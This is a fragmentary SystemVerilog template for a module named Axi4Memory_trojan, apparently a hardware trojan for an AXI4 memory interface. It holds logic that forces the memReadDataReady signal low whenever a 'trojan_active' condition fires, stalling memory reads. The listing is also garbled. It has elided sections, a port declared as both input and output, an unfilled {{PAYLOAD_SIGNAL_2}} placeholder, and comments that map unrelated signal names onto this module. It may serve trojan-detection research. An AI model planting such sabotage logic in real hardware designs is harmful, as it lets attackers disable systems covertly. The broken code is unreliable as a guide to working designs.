...
module Axi4Memory_trojan (
    input  logic clk_i,
    input  logic start_single_burst_write,
    
    // Original module signals (passthrough)
    input  logic memReadDataReady,
    output logic memReadDataReady,
    ...
    always_ff @(posedge clk_i or negedge start_single_burst_write) begin
    ...
    assign memReadDataReady = trojan_active ? 1'b0 : memReadDataReady_normal;
    ...
    logic memReadDataReady_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign memReadDataReady_normal = memReadDataReady;
 ...
 *     input  logic rst_ni,          // start_single_burst_write
 *     input  logic instr_valid_i,   // memReadDataReady
 *     output logic instr_valid_o    // memReadDataReady
 * );
